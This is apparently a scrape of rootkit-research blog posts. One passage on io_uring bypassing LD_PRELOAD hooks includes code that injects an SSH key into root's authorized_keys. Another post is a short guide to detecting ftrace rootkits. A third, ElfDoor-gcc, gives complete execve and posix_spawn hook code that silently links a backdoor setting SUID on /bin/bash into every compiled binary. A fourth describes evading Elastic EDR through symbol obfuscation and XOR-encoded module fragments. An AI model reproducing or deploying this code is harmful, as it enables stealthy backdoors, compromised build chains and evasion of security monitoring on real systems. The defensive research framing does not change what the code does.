kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, \u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], \u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); free(new_argv); return result; } } return real_posix_spawn(pid, path, file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":" Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 3: Ftrace Helper Obfuscation The Problem The Solution: Rename Ftrace Framework Functions Build Pipeline: Automated Obfuscation Workflow Final Test: Successful Evasion Bonus: Compilation Path Detection Bypass Bonus 2: Bypassing Elastic Behavioral Detection for Reverse Shells Conclusion Understanding the Threat Landscape: Elastic YARA Rules In a default environment with the Elastic agent installed, attempting to compile and load the Singularity rootkit results in immediate detection and files removed. The kernel object is automatically deleted and isolated in quarantine before it can be loaded into the kernel.\nThere were approximately 26 detections.\nUpon investigation, I identified the specific Elastic YARA rules detecting our rootkit:\nPrimary Detection Rules Linux_Rootkit_BrokePKG.yar\nLinux_Rootkit_Generic.yar\nLinux_Rootkit_Generic_61229bdf - Detects common rootkit patterns and function names Linux_Rootkit_Generic_482bca48 - Targets suspicious prefixes and hook patterns Linux_Rootkit_Generic_d0c5cfe0 - Detects initialization and hooking combinations Linux_Rootkit_Generic_f07bcabe - Identifies ftrace helper functions Linux_Rootkit_Generic_5d17781b - Targets license strings combined with kallsyms Linux_Rootkit_BrokePKG_7b7d4581 - Specific patterns from known rootkits Detection Signature Analysis Generic Rootkit Detection (61229bdf) Targets: hide_module, hook_getdents, orig_kill, fake_tcp4_seq_show, etc. Condition: 4 or more matching strings Total patterns: 57 distinct function names Hook Pattern Detection (482bca48) System strings: sys_call_table, kallsyms_lookup_name, kprobe Rootkit prefixes: rootkit, hide_, hacked_, fake_, hooked_ Hook suffixes: _getdents, _kill, _tcp4_seq_show, _udp4_seq_show Condition: 3 system strings AND (all prefixes OR 3 prefixes + 5 hooks) License String Detection (5d17781b) Targets: kallsyms_lookup_name_t + \u0026#34;license=GPL\u0026#34; Condition: Both strings must be present Purpose: Detects ftrace-based rootkits using kallsyms Ftrace Helper Detection (f07bcabe) Targets: - fh_install_hook - fh_remove_hook - fh_resolve_hook_address Condition: 2 or more matching strings BrokePKG Specific Detection (7b7d4581) License strings: - author=R3tr074 - name=brokepkg - description=Rootkit - license=GPL Specific strings: - brokepkg - brokepkg: module revealed - br0k3_n0w_h1dd3n Hook patterns: - nf_inet_hooks - ftrace_hook - hook_getdents - hook_kill - orig_tcp4_seq_show Condition: 3 license strings OR 2 specific strings OR 4 hook patterns Since our rootkit utilizes ftrace for syscall hooking, it naturally contains many of these patterns. The challenge becomes: how do we maintain functionality while evading static signature detection?\nThe Singularity Rootkit: Capabilities Overview Source: https://github.com/MatheuZSecurity/Singularity\nBefore diving into evasion techniques, let\u0026rsquo;s understand what the Singularity rootkit accomplishes:\nCore Features Process Hiding: Hides processes from /proc. File and Directory Hiding: Conceals files matching specific patterns (singularity, obliviate, matheuz, zer0t, etc.) Network Hiding: Hides TCP connections on port 8081 from netstat and packet capture tools Privilege Escalation: Provides root access via signal 59 (kill -59 ) or environment variable (MAGIC=mtz) ICMP Backdoor: Triggers reverse shell via magic ICMP packets (sequence 1337) Anti-Analysis Features:\nBlocks BPF programs and tracing Prevents ftrace manipulation by other users Disables module loading via init_module/finit_module hooks Filters /proc/kallsyms, /proc/modules, and tracefs Taint Clearing: Resets kernel taint flags to hide unsigned module loading Log Sanitization: Filters kernel logs (dmesg, /var/log/kern.log) to remove traces of the rootkit Module Stealth: Self-hiding from lsmod and /sys/module directory Evasion Technique 1: Symbol Name Randomization The Problem Rootkits typically use predictable naming patterns that become signatures:\nhook_getdents64 fake_tcp4_seq_show hide_module orig_kill hacked_open hooked_read Elastic\u0026rsquo;s YARA rules (61229bdf, 482bca48, d0c5cfe0) specifically target these prefixes:\n$rk1 = \u0026#34;rootkit\u0026#34; $rk2 = \u0026#34;hide_\u0026#34; $rk3 = \u0026#34;hacked_\u0026#34; $rk4 = \u0026#34;fake_\u0026#34; $rk5 = \u0026#34;hooked_\u0026#34; $hook1 = \u0026#34;_getdents\u0026#34; $hook2 = \u0026#34;_kill\u0026#34; $hook3 = \u0026#34;_tcp4_seq_show\u0026#34; The Solution: Intelligent Name Randomization Our Python obfuscator generates kernel-like generic names that blend in with legitimate kernel code:\ndef _generate_random_name(self) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Generates random name that avoids YARA patterns\u0026#34;\u0026#34;\u0026#34; # Avoid suspicious prefixes: hook_, fake_, hide_, hacked_, hooked_, orig_ # Use generic names that look legitimate prefixes = [\u0026#39;sys\u0026#39;, \u0026#39;kern\u0026#39;, \u0026#39;dev\u0026#39;, \u0026#39;mm\u0026#39;, \u0026#39;fs\u0026#39;, \u0026#39;net\u0026#39;, \u0026#39;proc\u0026#39;, \u0026#39;sched\u0026#39;] suffixes = [\u0026#39;handler\u0026#39;, \u0026#39;helper\u0026#39;, \u0026#39;worker\u0026#39;, \u0026#39;ops\u0026#39;, \u0026#39;func\u0026#39;, \u0026#39;entry\u0026#39;, \u0026#39;cb\u0026#39;] prefix = random.choice(prefixes) suffix = random.choice(suffixes) middle = \u0026#39;\u0026#39;.join(random.choices(string.ascii_lowercase, k=random.randint(3, 6))) return f\u0026#34;{prefix}_{middle}_{suffix}\u0026#34; Key Features No suspicious prefixes (hook_, fake_, hide_) Looks like legitimate kernel code Maintains internal consistency via mapping file Protects kernel API calls from renaming Protected Names The obfuscator maintains a whitelist of kernel API functions that must NOT be renamed:\ndef _get_protected_names(self) -\u0026gt; Set[str]: \u0026#34;\u0026#34;\u0026#34;Names from kernel that should NOT be changed\u0026#34;\u0026#34;\u0026#34; return { # Basic C types \u0026#39;int\u0026#39;, \u0026#39;void\u0026#39;, \u0026#39;long\u0026#39;, \u0026#39;char\u0026#39;, \u0026#39;size_t\u0026#39;, \u0026#39;ssize_t\u0026#39;, # Essentials \u0026#39;module_init\u0026#39;, \u0026#39;module_exit\u0026#39;, \u0026#39;THIS_MODULE\u0026#39;, \u0026#39;current\u0026#39;, \u0026#39;kmalloc\u0026#39;, \u0026#39;kfree\u0026#39;, \u0026#39;printk\u0026#39;, \u0026#39;pr_debug\u0026#39;, \u0026#39;copy_from_user\u0026#39;, \u0026#39;copy_to_user\u0026#39;, \u0026#39;fget\u0026#39;, \u0026#39;fput\u0026#39;, \u0026#39;kernel_read\u0026#39;, # Structures \u0026#39;pt_regs\u0026#39;, \u0026#39;file\u0026#39;, \u0026#39;task_struct\u0026#39;, \u0026#39;sk_buff\u0026#39;, # Entry points \u0026#39;main\u0026#39;, \u0026#39;init\u0026#39;, \u0026#39;exit\u0026#39;, } Function Name Extraction The obfuscator scans source files for function definitions using multiple regex patterns:\nself.function_patterns = [ r\u0026#39;\\bnotrace\\s+(?:static\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+(?:notrace\\s+)?(?:int|void|long|bool|ssize_t|asmlinkage)\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\bstatic\\s+asmlinkage\\s+\\w+\\s+(\\w+)\\s*\\(\u0026#39;, r\u0026#39;\\basmlinkage\\s+\\w+\\s+\\*?\\(?\\*?(\\w+)\\)?\u0026#39;, r\u0026#39;\\b(\\w+_init)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\b(\\w+_exit)\\s*\\(\\s*void\\s*\\)\u0026#39;, r\u0026#39;\\bHOOK\\s*\\([^,]+,\\s*(\\w+)\\s*,\u0026#39;, r\u0026#39;\\btypedef\\s+[^;]+\\s+(\\w+_t)\\s*;\u0026#39;, ] Example Transformation Before:\n// modules/hiding_directory.c static notrace long hook_getdents64(const struct pt_regs *regs) { long res = orig_getdents64(regs); // ... } static notrace long hook_getdents(const struct pt_regs *regs) { long res = orig_getdents(regs); // ... } After:\n// obfuscated/modules/hiding_directory.c static notrace long sys_abjker_handler(const struct pt_regs *regs) { long res = kern_wopqls_helper(regs); // ... } static notrace long fs_tnmqlk_ops(const struct pt_regs *regs) { long res = net_xzpnrm_func(regs); // ... } Implementation Details def _replace_in_content(self, content: str, mapping: Dict[str, str]) -\u0026gt; str: \u0026#34;\u0026#34;\u0026#34;Replace names in content\u0026#34;\u0026#34;\u0026#34; modified = content # Sort by descending length to avoid partial substitutions sorted_items = sorted(mapping.items(), key=lambda x: len(x[0]), reverse=True) for old_name, new_name in sorted_items: # Use word boundary for exact substitution pattern = r\u0026#39;\\b\u0026#39; + re.escape(old_name) + r\u0026#39;\\b\u0026#39; modified = re.sub(pattern, new_name, modified) return modified The key insight: we sort by length descending to prevent partial matches. For example, if we have both hook_kill and hook_kill_ex, we must replace hook_kill_ex first to avoid breaking it into sys_abc_handler_ex.\nEvasion Technique 2: Module Fragmentation The Problem EDR solutions scan loaded kernel modules primarily on disk. A monolithic .ko file presents a single attack surface that\u0026rsquo;s easy to analyze:\nSignature scanning of the entire module on disk Static analysis of ELF structure Symbol table enumeration String pattern detection (including \u0026ldquo;GPL\u0026rdquo;, \u0026ldquo;kallsyms_lookup_name\u0026rdquo;, etc.) The Solution: Fragment + XOR Encoding + Ephemeral In-Memory Loading We split the compiled module into encrypted chunks that are only reassembled in memory during loading. This technique breaks static disk-based analysis while maintaining functionality.\nHow This Evades Detection The evasion works through a multi-layered approach:\nDisk-Based YARA Evasion: XOR encoding breaks string signatures in stored fragments Ephemeral Reconstruction: The complete module exists in plaintext only briefly in a temporary memfd Self-Hiding Post-Load: The rootkit immediately conceals itself after loading Important Technical Note: After XOR decoding during the load process, strings like \u0026ldquo;GPL\u0026rdquo; and \u0026ldquo;kallsyms_lookup_name\u0026rdquo; are restored to plaintext in memory. However, Elastic\u0026rsquo;s YARA rules primarily scan 